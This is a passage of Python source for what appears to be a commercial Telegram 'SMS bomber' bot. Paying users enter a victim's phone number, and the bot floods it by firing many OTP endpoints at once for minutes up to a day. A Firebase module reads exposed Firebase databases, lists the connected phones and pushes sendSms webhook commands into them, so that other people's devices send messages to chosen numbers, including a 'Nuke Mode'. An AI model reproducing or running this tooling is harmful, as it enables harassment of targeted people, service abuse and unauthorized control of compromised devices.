    global_cap = setting("concurrency", int) or DEFAULT_CONCURRENCY
    per_host_cap = DEFAULT_PER_HOST_CAP

    ok = [0]
    fail = [0]
    last_report = [0.0]
    end_at = time.time() + duration_sec

    def host_of(u):
        try:
            return u.split("//", 1)[1].split("/", 1)[0]
        except Exception:
            return u

    host_sems = {}
    for a in apis:
        h = host_of(a["url"])
        if h not in host_sems:
            host_sems[h] = asyncio.Semaphore(per_host_cap)

    by_cat = {}
    for a in apis:
        by_cat.setdefault(a["category"], []).append(a)
    weights = []
    for cat, lst in by_cat.items():
        w = max(1, 60 // len(lst))
        for _ in lst:
            weights.append(w)
    total_weight = sum(weights) or 1
    n_workers = min(global_cap * 2, 4000)
    worker_plan = []
    for i, a in enumerate(apis):
        share = max(1, (weights[i] * n_workers) // total_weight)
        for _ in range(share):
            worker_plan.append(a)

    global_sem = asyncio.Semaphore(global_cap)

    connector = aiohttp.TCPConnector(
        limit=global_cap * 2,
        limit_per_host=per_host_cap * 2,
        ttl_dns_cache=300,
        use_dns_cache=True,
        ssl=False,
        force_close=False,
    )
    session = aiohttp.ClientSession(connector=connector,
                                    auto_decompress=False,
                                    headers={"User-Agent": USER_AGENT})

    async def _fire(api):
        tgt = fmt_target(target, api["category"])
        h = host_of(api["url"])
        async with global_sem:
            async with host_sems[h]:
                return await _hit_http(session, api, tgt, "OTP")

    async def worker(api):
        while time.time() < end_at and not stop_ev.is_set():
            try:
                hit = await _fire(api)
            except Exception:
                hit = False
            if hit:
                ok[0] += 1
            else:
                fail[0] += 1
            _update_api_health(api["id"], hit)
            if progress_cb:
                now = time.time()
                if now - last_report[0] >= 2.0:
                    last_report[0] = now
                    try:
                        await progress_cb(ok[0], fail[0],
                                          int(end_at - now))
                    except Exception:
                        pass

    try:
        tasks = [asyncio.create_task(worker(a)) for a in worker_plan]
        await asyncio.gather(*tasks, return_exceptions=True)
    finally:
        try:
            await session.close()
        except Exception:
            pass

    return ok[0], fail[0], None


# ─────────────────────────────────────────────────────────────
# FIREBASE CORE — real device control (bommer.py pattern)
# ─────────────────────────────────────────────────────────────
FB_TIMEOUT = aiohttp.ClientTimeout(total=10, connect=5)
FB_HEADERS = {"User-Agent": USER_AGENT}


async def fb_get_json(session, url, path=".json", shallow=False):
    full = url.rstrip("/") + path
    if shallow:
        full += "?shallow=true" if "?" not in full else "&shallow=true"
    try:
        async with session.get(full, headers=FB_HEADERS,
                               timeout=FB_TIMEOUT, ssl=False) as r:
            if r.status != 200:
                return None, f"http {r.status}"
            txt = (await r.text()).strip()
            if not txt or txt == "null":
                return {}, None
            try:
                return json.loads(txt), None
            except Exception as e:
                return None, f"json: {str(e)[:60]}"
    except asyncio.TimeoutError:
        return None, "timeout"
    except Exception as e:
        return None, str(e)[:80]


async def fb_put_json(session, url, path, payload):
    full = url.rstrip("/") + path
    body = json.dumps(payload, ensure_ascii=False).encode("utf-8")
    headers = dict(FB_HEADERS)
    headers["Content-Type"] = "application/json"
    for attempt in range(2):
        try:
            async with session.put(full, data=body, headers=headers,
                                   timeout=FB_TIMEOUT, ssl=False) as r:
                await r.read()
                if 200 <= r.status < 300:
                    return True
        except Exception:
            pass
        if attempt == 0:
            await asyncio.sleep(0.3)
    return False


def device_is_online(d):
    if not isinstance(d, dict):
        return False
    for k in ("isOnline", "online", "connected", "is_online", "active"):
        v = d.get(k)
        if v is True:
            return True
        if isinstance(v, str) and v.lower() in ("true", "online", "active", "1"):
            return True
        if isinstance(v, (int, float)) and v == 1:
            return True
    st = d.get("status")
    if isinstance(st, str) and st.lower() in ("online", "active"):
        return True
    for k in ("lastSeen", "last_seen", "lastseen", "lastOnline"):
        try:
            t = float(d.get(k))
            if t > 1e12:
                t //= 1000
            if time.time() - t < 300:
                return True
        except Exception:
            pass
    return False


def device_sim_slots(d):
    sims = d.get("sims") or []
    slots = []
    if isinstance(sims, list):
        for s in sims:
            if isinstance(s, dict):
                idx = s.get("simSlotIndex",
                            s.get("slot", s.get("index", 0)))
                try:
                    slots.append(int(idx))
                except Exception:
                    pass
    if not slots:
        slots = [0]
    return slots


def device_label(d, fallback=""):
    for k in ("deviceName", "name", "model", "deviceModel", "deviceId"):
        v = d.get(k) if isinstance(d, dict) else None
        if v:
            return str(v)[:40]
    return fallback[:40] if fallback else "device"


async def fb_fetch_clients(session, fb_url, max_devices=500):
    """Shallow list of client IDs. Then fetch each device in small parallel
    batches. Returns list of dicts: {dev_id, dev_name, is_online, sims}."""
    ids_obj, err = await fb_get_json(session, fb_url, "/clients.json",
                                     shallow=True)
    if err or not isinstance(ids_obj, dict):
        return [], err or "no clients node"

    dev_ids = list(ids_obj.keys())
    if len(dev_ids) > max_devices:
        dev_ids = dev_ids[:max_devices]

    out = []
    sem = asyncio.Semaphore(20)

    async def one(dev_id):
        async with sem:
            data, e = await fb_get_json(session, fb_url,
                                        f"/clients/{dev_id}.json")
            if e or not isinstance(data, dict):
                return
            out.append({
                "dev_id": dev_id,
                "dev_name": device_label(data, dev_id),
                "is_online": device_is_online(data),
                "sims": device_sim_slots(data),
                "raw": data,
            })

    CH = 40
    for i in range(0, len(dev_ids), CH):
        batch = dev_ids[i:i + CH]
        await asyncio.gather(*(one(d) for d in batch))
        await asyncio.sleep(0.02)

    return out, None


async def fb_send_sms(session, fb_url, dev_id, sim_slot, to, message):
    payload = {
        "from": sim_slot,
        "to": str(to).strip(),
        "message": str(message).strip(),
        "isSended": False,
        "timestamp": int(time.time()),
    }
    return await fb_put_json(
        session, fb_url,
        f"/clients/{dev_id}/webhookEvent/sendSms.json",
        payload
    )


async def fb_scan_target(fid):
    t = _exec("SELECT id, url, name FROM firebase_targets WHERE id=?",
              (fid,), fetch="one")
    if not t:
        return {"ok": False, "error": "not found"}

    connector = aiohttp.TCPConnector(ssl=False, limit=40, limit_per_host=20)
    session = aiohttp.ClientSession(connector=connector)

    now = int(time.time())
    try:
        devices, err = await fb_fetch_clients(session, t["url"])
    finally:
        try:
            await session.close()
        except Exception:
            pass

    if err:
        _exec("UPDATE firebase_targets SET reachable=0, last_scan=?, "
              "last_error=? WHERE id=?", (now, err[:200], fid))
        return {"ok": False, "error": err}

    online = 0
    total = len(devices)
    saved = 0

    _exec("DELETE FROM firebase_devices WHERE firebase_id=?", (fid,))

    for d in devices:
        if d["is_online"]:
            online += 1
        sims = d["sims"] or [0]
        phone = ""
        raw = d.get("raw") or {}
        for k in ("number", "phone", "mobile", "simNumber"):
            if raw.get(k):
                digits = "".join(c for c in str(raw[k]) if c.isdigit())
                if 10 <= len(digits) <= 13:
                    phone = digits[-10:]
                    break
        info = json.dumps({
            "name": d["dev_name"],
            "sims": sims,
            "online": d["is_online"],
        }, separators=(",", ":"))
        try:
            _exec("INSERT OR REPLACE INTO firebase_devices"
                  "(firebase_id,device_key,phone,info,otp,path,last_seen) "
                  "VALUES(?,?,?,?,?,?,?)",
                  (fid, d["dev_id"], phone, info, "",
                   "/clients", now))
            saved += 1
        except Exception:
            pass

    _exec("UPDATE firebase_targets SET reachable=1, device_count=?, "
          "online_count=?, total_count=?, last_scan=?, last_error='' "
          "WHERE id=?",
          (saved, online, total, now, fid))

    log.info("fb scan #%d: online=%d total=%d", fid, online, total)
    return {"ok": True, "online": online, "total": total, "saved": saved}


async def scan_batch(batch_size=FIREBASE_BATCH_SIZE, progress_cb=None):
    rows = _exec(
        "SELECT id FROM firebase_targets WHERE active=1 "
        "ORDER BY last_scan ASC, id ASC LIMIT ?",
        (batch_size,), fetch="all")
    total = len(rows)
    if total == 0:
        return 0, 0, 0, 0

    results = {"done": 0, "ok": 0, "fail": 0}
    lock = asyncio.Lock()
    sem = asyncio.Semaphore(FIREBASE_SCAN_PARALLEL)

    async def one(fid):
        async with sem:
            try:
                res = await fb_scan_target(fid)
                async with lock:
                    results["done"] += 1
                    if res.get("ok"):
                        results["ok"] += 1
                    else:
                        results["fail"] += 1
            except Exception as e:
                log.warning("scan %s: %s", fid, e)
                async with lock:
                    results["done"] += 1
                    results["fail"] += 1
            finally:
                gc.collect()
            if progress_cb:
                try:
                    await progress_cb(results["done"], total,
                                      results["ok"], results["fail"])
                except Exception:
                    pass

    await asyncio.gather(*(asyncio.create_task(one(r["id"])) for r in rows),
                         return_exceptions=True)
    gc.collect()

    never = _exec("SELECT COUNT(*) c FROM firebase_targets WHERE active=1 "
                  "AND last_scan = 0", fetch="one")["c"]
    return results["ok"], results["fail"], total, never


async def scan_all_firebase(progress_cb=None, per_batch=None):
    per_batch = per_batch or FIREBASE_BATCH_SIZE
    total_ok = 0
    total_fail = 0
    total_done = 0

    while True:
        try:
            ok, fail, done, remaining = await scan_batch(
                batch_size=per_batch, progress_cb=progress_cb)
        except Exception:
            log.exception("scan batch crashed")
            break
        if done == 0:
            break
        total_ok += ok
        total_fail += fail
        total_done += done
        gc.collect()
        await asyncio.sleep(1.0)
        if done < per_batch:
            break

    return total_ok, total_fail, total_done


def fb_test_slot_get(slot):
    return _exec("SELECT * FROM firebase_test_ids WHERE slot=?",
                 (slot,), fetch="one")


def fb_test_slot_set(slot, fid, device_key):
    _exec("INSERT OR REPLACE INTO firebase_test_ids(slot,firebase_id,"
          "device_key,added_at) VALUES(?,?,?,?)",
          (slot, fid, device_key, int(time.time())))


def fb_test_slot_clear(slot):
    _exec("DELETE FROM firebase_test_ids WHERE slot=?", (slot,))


async def fb_test_fire(slot, target_number, message):
    row = fb_test_slot_get(slot)
    if not row:
        return False, "no slot set"
    t = _exec("SELECT * FROM firebase_targets WHERE id=?",
              (row["firebase_id"],), fetch="one")
    if not t:
        return False, "firebase missing"
    connector = aiohttp.TCPConnector(ssl=False)
    session = aiohttp.ClientSession(connector=connector)
    slots = [0]
    try:
        dev, err = await fb_get_json(session, t["url"],
                                     f"/clients/{row['device_key']}.json")
        if err or not isinstance(dev, dict):
            return False, f"device fetch: {err}"
        slots = device_sim_slots(dev) or [0]
        ok = await fb_send_sms(session, t["url"], row["device_key"],
                               slots[0], target_number, message)
    finally:
        try:
            await session.close()
        except Exception:
            pass
    return ok, (f"sim slot {slots[0]}" if ok else "webhook failed")


# ─────────────────────────────────────────────────────────────
# BOT + DISPATCHER
# ─────────────────────────────────────────────────────────────
bot = Bot(token=BOT_TOKEN,
          default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=MemoryStorage())
dp.message.middleware(AutoRegisterMiddleware())
dp.callback_query.middleware(AutoRegisterMiddleware())

BOMB_STOPS = {}
FB_SEND_STOPS = {}


# ─────────────────────────────────────────────────────────────
# FSM
# ─────────────────────────────────────────────────────────────
class UserFSM(StatesGroup):
    bomb_target      = State()
    redeem_code      = State()
    fb_target_number = State()
    fb_message       = State()


class AdminFSM(StatesGroup):
    add_credits_uid   = State()
    add_credits_amt   = State()
    add_coins_uid     = State()
    add_coins_amt     = State()
    grant_lt_uid      = State()
    revoke_lt_uid     = State()
    redeem_amount     = State()
    redeem_uses       = State()
    broadcast         = State()
    find_user         = State()
    edit_setting      = State()
    blacklist_add     = State()
    fb_add_url        = State()
    fb_remove_id      = State()
    fb_view_devices   = State()
    fb_view_messages  = State()
    fb_push_id        = State()
    fb_push_msg       = State()
    fb_slot_set       = State()
    fb_slot_fire_num  = State()
    fb_slot_fire_msg  = State()
    fb_nuke_fid       = State()
    fb_nuke_number    = State()
    fb_nuke_msg       = State()


# ─────────────────────────────────────────────────────────────
# KEYBOARDS
# ─────────────────────────────────────────────────────────────
def main_menu_kb(admin=False, has_lifetime=False):
    rows = [
        [InlineKeyboardButton(text="💣 SMS BOMBER",     callback_data="b:start"),
         InlineKeyboardButton(text="🔥 FIREBASE BLAST", callback_data="f:home")],
        [InlineKeyboardButton(text="📱 Devices",         callback_data="f:devs:0"),
         InlineKeyboardButton(text="🎯 Test IDs",        callback_data="f:slots")],
        [InlineKeyboardButton(text="💰 Balance", callback_data="m:bal"),
         InlineKeyboardButton(text="🎁 Redeem",  callback_data="m:redeem")],
        [InlineKeyboardButton(text="📜 History", callback_data="m:hist"),
         InlineKeyboardButton(text="🎉 Daily",   callback_data="m:daily")],
        [InlineKeyboardButton(text="📖 Help",    callback_data="m:help"),
         InlineKeyboardButton(text="📞 Contact",
                              url=f"https://t.me/{ADMIN_CONTACT.lstrip('@')}")],
    ]
    if not has_lifetime:
        rows.insert(3, [InlineKeyboardButton(
            text=f"⭐ Buy Lifetime ({setting('lifetime_cost')} cr)",
            callback_data="m:lifetime")])
    if admin:
        rows.append([InlineKeyboardButton(text="🛠 Admin Panel",
                                          callback_data="a:home")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def cancel_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="❌ Cancel", callback_data="m:cancel")]
    ])


def back_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🏠 Main Menu", callback_data="m:home")]
    ])


def duration_kb():
    c = setting("cost_per_min", int)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"1 min ({c}c)",   callback_data="b:dur:1"),
         InlineKeyboardButton(text=f"5 min ({5*c}c)", callback_data="b:dur:5"),
         InlineKeyboardButton(text=f"15m ({15*c}c)",  callback_data="b:dur:15")],
        [InlineKeyboardButton(text=f"30m ({30*c}c)",  callback_data="b:dur:30"),
         InlineKeyboardButton(text=f"1h ({60*c}c)",   callback_data="b:dur:60"),
         InlineKeyboardButton(text="♾️ Lifetime",
                              callback_data="b:dur:lt")],
        [InlineKeyboardButton(text="❌ Cancel", callback_data="m:cancel")],
    ])


def admin_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📊 Stats",         callback_data="a:stats"),
         InlineKeyboardButton(text="👥 Users",         callback_data="a:users:0")],
        [InlineKeyboardButton(text="➕ Credits",       callback_data="a:add"),
         InlineKeyboardButton(text="➖ Remove Credits", callback_data="a:ded")],
        [InlineKeyboardButton(text="🪙 Add Coins",     callback_data="a:add_coins"),
         InlineKeyboardButton(text="⭐ Grant Lifetime",  callback_data="a:lt_grant")],
        [InlineKeyboardButton(text="🚫 Revoke Lifetime", callback_data="a:lt_revoke"),
         InlineKeyboardButton(text="👑 Lifetime List",  callback_data="a:lt_list")],
        [InlineKeyboardButton(text="🎁 Redeem Codes",  callback_data="a:redeem"),
         InlineKeyboardButton(text="🔌 APIs",          callback_data="a:apis")],
        [InlineKeyboardButton(text="⚙️ Settings",      callback_data="a:settings"),
         InlineKeyboardButton(text="🔥 Firebase Panel", callback_data="a:fb")],
        [InlineKeyboardButton(text="🚫 Blacklist",     callback_data="a:black"),
         InlineKeyboardButton(text="🔎 Find User",     callback_data="a:find")],
        [InlineKeyboardButton(text="📢 Broadcast",     callback_data="a:bcast"),
         InlineKeyboardButton(text="📋 Logs",          callback_data="a:logs:0")],
        [InlineKeyboardButton(text="📤 Export Users",  callback_data="a:export"),
         InlineKeyboardButton(text="🏠 Main Menu",     callback_data="m:home")],
    ])


def admin_back_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⬅️ Back to Admin", callback_data="a:home")]
    ])


def fb_admin_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📊 Status",        callback_data="a:fb_status"),
         InlineKeyboardButton(text="🔄 Scan Next 20",  callback_data="a:fb_scan")],
        [InlineKeyboardButton(text="🔄 Scan All",      callback_data="a:fb_scan_full")],
        [InlineKeyboardButton(text="📱 View Devices",  callback_data="a:fb_devices"),
         InlineKeyboardButton(text="📨 Push Broadcast", callback_data="a:fb_push")],
        [InlineKeyboardButton(text="🎯 Test ID 1",     callback_data="a:fb_slot1"),
         InlineKeyboardButton(text="🎯 Test ID 2",     callback_data="a:fb_slot2")],
        [InlineKeyboardButton(text="💣 Nuke Mode",     callback_data="a:fb_nuke")],
        [InlineKeyboardButton(text="➕ Add Target",    callback_data="a:fb_add"),
         InlineKeyboardButton(text="🗑 Remove",         callback_data="a:fb_remove")],
        [InlineKeyboardButton(text="⬅️ Back",           callback_data="a:home")],
    ])


def fb_slot_kb(slot):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📨 Fire from this device",
                              callback_data=f"f:slot_fire:{slot}")],
        [InlineKeyboardButton(text="🔄 Change device",
                              callback_data=f"f:slot_set:{slot}"),
         InlineKeyboardButton(text="🗑 Clear slot",
                              callback_data=f"f:slot_clear:{slot}")],
        [InlineKeyboardButton(text="⬅️ Back", callback_data="a:fb")],
    ])


def fb_user_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📨 Send to a number", callback_data="f:send_start")],
        [InlineKeyboardButton(text="📱 Devices",          callback_data="f:devs:0")],
        [InlineKeyboardButton(text="📊 Status",           callback_data="f:status")],
        [InlineKeyboardButton(text="🏠 Menu",             callback_data="m:home")],
    ])


def fb_devices_kb(page=0, per=10):
    total = _exec("SELECT COUNT(*) c FROM firebase_targets WHERE active=1",
                  fetch="one")["c"]
    max_p = max(0, (total - 1) // per)
    page = min(page, max_p)
    rows = _exec(
        "SELECT id, name, online_count, total_count, device_count "
        "FROM firebase_targets WHERE active=1 "
        "ORDER BY online_count DESC, device_count DESC, id "
        "LIMIT ? OFFSET ?", (per, page * per), fetch="all")
    kb_rows = []
    for r in rows:
        label = (f"🟢 {r['online_count'] or 0}/{r['total_count'] or 0} · "
                 f"#{r['id']} · {r['name'][:22]}")
        kb_rows.append([InlineKeyboardButton(
            text=label,
            callback_data=f"f:devlist:{r['id']}:0")])
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton(text="⬅️",
                                        callback_data=f"f:devs:{page-1}"))
    if page < max_p:
        nav.append(InlineKeyboardButton(text="➡️",
                                        callback_data=f"f:devs:{page+1}"))
    if nav:
        kb_rows.append(nav)
    kb_rows.append([InlineKeyboardButton(text="🏠 Menu", callback_data="m:home")])
    return InlineKeyboardMarkup(inline_keyboard=kb_rows), page, max_p, total


def fb_slots_user_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎯 Test ID 1",
                              callback_data="f:slot_view:1"),
         InlineKeyboardButton(text="🎯 Test ID 2",
                              callback_data="f:slot_view:2")],
        [InlineKeyboardButton(text="🏠 Menu", callback_data="m:home")],
    ])


# ─────────────────────────────────────────────────────────────
# COMMANDS
# ─────────────────────────────────────────────────────────────
@dp.message(CommandStart(deep_link=True))
async def cmd_start_ref(m: types.Message, state: FSMContext):
    try:
        await state.clear()
        args = m.text.split(maxsplit=1) if m.text else []
        payload = args[1].strip() if len(args) > 1 else ""
        ref = None
        mm = re.match(r"^ref_(\d+)$", payload)
        if mm:
            ref = int(mm.group(1))
        u = ensure_user(m.from_user, referrer=ref)
        if u["banned"]:
            return await m.answer("🚫 You are banned.")
        await _welcome(m, u)
    except Exception:
        log.exception("start_ref fail")


@dp.message(CommandStart())
async def cmd_start(m: types.Message, state: FSMContext):
    try:
        await state.clear()
        u = ensure_user(m.from_user)
        if u["banned"]:
            return await m.answer("🚫 You are banned.")
        await _welcome(m, u)
    except Exception:
        log.exception("start fail")


async def _welcome(m, u):
    admin = is_admin(m.from_user.id)
    await m.answer(
        f"👋 <b>Welcome {m.from_user.first_name}</b>\n\n"
        f"🆔 <code>{m.from_user.id}</code>\n"
        f"💳 Credits: <b>{u['credits']}</b>\n"
        f"🪙 Coins: <b>{u['coins']}</b>\n"
        f"{'⭐ LIFETIME active' if u['lifetime'] else ''}"
        f"{'👑 ADMIN — unlimited' if admin else ''}\n\n"
        f"Pick an option:",
        reply_markup=main_menu_kb(admin, bool(u["lifetime"]) or admin))


@dp.message(Command("admin"))
async def cmd_admin(m: types.Message, state: FSMContext):
    try:
        await state.clear()
        if not is_admin(m.from_user.id):
            return
        await m.answer("🛠 <b>Admin Panel</b>", reply_markup=admin_kb())
    except Exception:
        log.exception("admin cmd")


@dp.message(Command("stop"))
async def cmd_stop(m: types.Message):
    try:
        stopped = False
        ev = BOMB_STOPS.get(m.from_user.id)
        if ev:
            ev.set()
            stopped = True
        ev2 = FB_SEND_STOPS.get(m.from_user.id)
        if ev2:
            ev2.set()
            stopped = True
        await m.answer("🛑 Stop signal sent." if stopped else "Nothing running.")
    except Exception:
        log.exception("stop cmd")


@dp.message(Command("reseed"))
async def cmd_reseed(m: types.Message):
    try:
        if not is_admin(m.from_user.id):
            return
        seed_all_endpoints(force_refresh=True)
        seed_firebase(force_refresh=True)
        a = _exec("SELECT COUNT(*) c FROM apis", fetch="one")["c"]
        f = _exec("SELECT COUNT(*) c FROM firebase_targets",
                  fetch="one")["c"]
        await m.answer(f"✅ Reseeded.\nAPIs: <b>{a}</b>\nFirebase: <b>{f}</b>")
    except Exception:
        log.exception("reseed cmd")


# ─────────────────────────────────────────────────────────────
# MAIN MENU
# ─────────────────────────────────────────────────────────────
@dp.callback_query(F.data == "m:home")
async def cb_home(c: types.CallbackQuery, state: FSMContext):
    try:
        await state.clear()
        u = get_user(c.from_user.id)
        admin = is_admin(c.from_user.id)
        await c.message.edit_text(
            f"🏠 <b>Main Menu</b>\n\n"
            f"💳 Credits: <b>{u['credits']}</b>\n"
            f"🪙 Coins: <b>{u['coins']}</b>\n"
            f"💥 Bombs: <b>{u['total_bombs']}</b>\n"
            f"📨 Sent: <b>{u['total_sent']}</b>\n"
            f"🔥 Firebase: <b>{u['total_pushes']}</b>\n"
            f"{'⭐ LIFETIME' if u['lifetime'] else ''}"
            f"{'👑 ADMIN' if admin else ''}",
            reply_markup=main_menu_kb(admin, bool(u["lifetime"]) or admin))
    except Exception:
        log.exception("home")
    finally:
        await c.answer()


@dp.callback_query(F.data == "m:cancel")
async def cb_cancel(c: types.CallbackQuery, state: FSMContext):
    try:
        await state.clear()
        u = get_user(c.from_user.id)
        admin = is_admin(c.from_user.id)
        await c.message.edit_text(
            "❌ Cancelled.",
            reply_markup=main_menu_kb(admin, bool(u["lifetime"]) or admin))
    except Exception:
        log.exception("cancel")
    finally:
        await c.answer()


@dp.callback_query(F.data == "m:bal")
async def cb_bal(c: types.CallbackQuery):
    try:
        u = get_user(c.from_user.id)
        try:
            bot_me = await bot.get_me()
            ref_link = f"https://t.me/{bot_me.username}?start=ref_{u['user_id']}"
        except Exception:
            ref_link = "n/a"
        admin = is_admin(c.from_user.id)
        lt = "⭐ ACTIVE" if u["lifetime"] or admin else "❌ Not active"
        await c.message.edit_text(
            f"💰 <b>Account</b>\n\n"
            f"🆔 <code>{u['user_id']}</code>\n"
            f"💳 Credits: <b>{u['credits']}</b>"
            f"{'  (∞ admin)' if admin else ''}\n"
            f"🪙 Coins: <b>{u['coins']}</b>"
            f"{'  (∞ admin)' if admin else ''}\n"
            f"⭐ Lifetime: <b>{lt}</b>\n"
            f"💥 Bombs: <b>{u['total_bombs']}</b>\n"
            f"📨 Sent: <b>{u['total_sent']}</b>\n"
            f"🔥 Firebase: <b>{u['total_pushes']}</b>\n"
            f"🔗 Referrals: <b>{u['ref_count']}</b>\n\n"
            f"<b>Invite:</b>\n<code>{ref_link}</code>",
            reply_markup=back_kb())
    except Exception:
        log.exception("bal")
    finally:
        await c.answer()


@dp.callback_query(F.data == "m:help")
async def cb_help(c: types.CallbackQuery):
    try:
        total_apis = _exec("SELECT COUNT(*) c FROM apis WHERE active=1",
                           fetch="one")["c"]
        total_fb = _exec("SELECT COUNT(*) c FROM firebase_targets",
                         fetch="one")["c"]
        await c.message.edit_text(
            "📖 <b>How to use</b>\n\n"
            "<b>💣 SMS BOMBER</b>\n"
            "Target → duration → fires all APIs at once\n\n"
            "<b>🔥 FIREBASE BLAST</b>\n"
            "Number + msg → real device webhooks fire SMS from every "
            "online device\n\n"
            "<b>📱 Devices</b>\n"
            "See every scanned firebase with online/total counts\n\n"
            "<b>🎯 Test IDs</b>\n"
            "Pre-saved device slots\n\n"
            f"🔌 APIs: <b>{total_apis}</b> · 🔥 Firebase: <b>{total_fb}</b>",
            reply_markup=back_kb())
    except Exception:
        log.exception("help")
    finally:
        await c.answer()


@dp.callback_query(F.data == "m:hist")
async def cb_hist(c: types.CallbackQuery):
    try:
        rows = _exec(
            "SELECT * FROM bomb_history WHERE user_id=? "
            "ORDER BY ts DESC LIMIT 10",
            (c.from_user.id,), fetch="all")
        if not rows:
            txt = "📜 No history yet."
        else:
            lines = []
            for r in rows:
                t = time.strftime("%m-%d %H:%M", time.localtime(r["ts"]))
                lines.append(
                    f"• [{r['category']}] <code>{r['target'][:20]}</code> → "
                    f"{r['ok']}✅ {r['fail']}❌ ({t})")
            txt = "📜 <b>Last 10</b>\n\n" + "\n".join(lines)
        await c.message.edit_text(txt, reply_markup=back_kb())
    except Exception:
        log.exception("hist")
    finally:
        await c.answer()


@dp.callback_query(F.data == "m:daily")
async def cb_daily(c: types.CallbackQuery):
    try:
        u = get_user(c.from_user.id)
        now = int(time.time())
        if now - u["last_daily"] < 86400:
            wait = 86400 - (now - u["last_daily"])
            h, rem = divmod(wait, 3600)
            mm = rem // 60
            return await c.answer(f"⏳ Next in {h}h {mm}m",
                                  show_alert=True)
        bonus = setting("daily_bonus", int)
        add_credits(c.from_user.id, bonus)
        _exec("UPDATE users SET last_daily=? WHERE user_id=?",
              (now, c.from_user.id))
        u2 = get_user(c.from_user.id)
        await c.answer(f"🎉 +{bonus} credits!", show_alert=True)
        try:
            await c.message.edit_text(
                f"🎉 Daily bonus: +{bonus}\n"
                f"💳 Balance: <b>{u2['credits']}</b>",
                reply_markup=back_kb())
        except Exception:
            pass
    except Exception:
        log.exception("daily")


@dp.callback_query(F.data == "m:lifetime")
async def cb_buy_lifetime(c: types.CallbackQuery):
    try:
        u = get_user(c.from_user.id)
        if u["lifetime"] or is_admin(c.from_user.id):
            return await c.answer("Already active.", show_alert=True)
        cost = setting("lifetime_cost", int)
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=f"✅ Pay {cost} credits",
                                  callback_data="m:lt_buy")],
            [InlineKeyboardButton(text="❌ Cancel", callback_data="m:cancel")]
        ])
        await c.message.edit_text(
            f"⭐ <b>Buy Lifetime</b>\n\n"
            f"Cost: <b>{cost}</b> credits (one-time)\n\n"
            f"• Free unlimited bombs\n"
            f"• No per-minute cost\n\n"
            f"Your balance: <b>{u['credits']}</b> credits",
            reply_markup=kb)
    except Exception:
        log.exception("lifetime prompt")
    finally:
        await c.answer()


@dp.callback_query(F.data == "m:lt_buy")
async def cb_lt_buy(c: types.CallbackQuery):
    try:
        u = get_user(c.from_user.id)
        if u["lifetime"]:
            return await c.answer("Already active.", show_alert=True)
        cost = setting("lifetime_cost", int)
        if not take_credits(c.from_user.id, cost):
            return await c.answer(f"❌ Need {cost} credits.",
                                  show_alert=True)
        _exec("UPDATE users SET lifetime=1 WHERE user_id=?",
              (c.from_user.id,))
        log_action(c.from_user.id, "buy_lifetime", f"cost={cost}")
        await c.answer("⭐ Lifetime activated!", show_alert=True)
        await c.message.edit_text(
            f"⭐ <b>Lifetime activated</b>\n\n"
            f"💳 Balance: <b>{get_user(c.from_user.id)['credits']}</b>",
            reply_markup=main_menu_kb(is_admin(c.from_user.id), True))
    except Exception:
        log.exception("lifetime buy")


# ─────────────────────────────────────────────────────────────
# SMS BOMBER FLOW
# ─────────────────────────────────────────────────────────────
@dp.callback_query(F.data == "b:start")
async def cb_bomb_start(c: types.CallbackQuery, state: FSMContext):
    try:
        u = get_user(c.from_user.id)
        if u["banned"]:
            return await c.answer("You are banned.", show_alert=True)
        if setting("maintenance", int) and not is_admin(c.from_user.id):
            return await c.answer("Maintenance mode.", show_alert=True)
        total_apis = _exec("SELECT COUNT(*) c FROM apis WHERE active=1",
                           fetch="one")["c"]
        await state.set_state(UserFSM.bomb_target)
        await c.message.edit_text(
            f"💣 <b>SMS BOMBER</b>\n\n"
            f"Send target number.\n"
            f"Example: <code>9922458565</code>\n\n"
            f"🔌 <b>{total_apis}</b> endpoints loaded",
            reply_markup=cancel_kb())
    except Exception:
        log.exception("bomb start")
    finally:
        await c.answer()


@dp.message(UserFSM.bomb_target, F.text)
async def fsm_bomb_target(m: types.Message, state: FSMContext):
    try:
        txt = (m.text or "").strip()
        if txt.startswith("/"):
            await state.clear()
            return
        digits = "".join(ch for ch in txt if ch.isdigit())
        if len(digits) < 10:
            return await m.answer("❌ Invalid number.",
                                  reply_markup=cancel_kb())
        target = digits[-10:]
        await state.update_data(target=target)
        u = get_user(m.from_user.id)
        cpm = setting("cost_per_min", int)
        admin = is_admin(m.from_user.id)
        await m.answer(
            f"🎯 Target: <code>{target}</code>\n\n"
            f"<b>Pick duration:</b>\n"
            f"<i>1 min = {cpm} credit</i>"
            + ("\n♾️ <b>Lifetime — free</b>" if u["lifetime"] else "")
            + ("\n👑 <b>ADMIN — free</b>" if admin else ""),
            reply_markup=duration_kb())
    except Exception:
        log.exception("fsm bomb target")


@dp.callback_query(F.data.startswith("b:dur:"))
async def cb_duration(c: types.CallbackQuery, state: FSMContext):
    try:
        part = c.data.split(":")[2]
        data = await state.get_data()
        target = data.get("target")
        if not target:
            await state.clear()
            return await c.answer("Expired.", show_alert=True)
        u = get_user(c.from_user.id)
        admin = is_admin(c.from_user.id)
        if part == "lt":
            if not (u["lifetime"] or admin):
                await state.clear()
                return await c.answer("Lifetime not active.",
                                      show_alert=True)
            duration_min = 1440
            cost = 0
        else:
            try:
                duration_min = int(part)
            except ValueError:
                return await c.answer("bad")
            cpm = setting("cost_per_min", int)
            cost = 0 if (u["lifetime"] or admin) else duration_min * cpm
        if cost > 0 and not take_credits(c.from_user.id, cost):
            await state.clear()
            return await c.answer(f"❌ Need {cost} credits.",
                                  show_alert=True)
        await state.clear()
        await _launch_bomber(c.message, c.from_user.id, target,
                             duration_min, cost)
    except Exception:
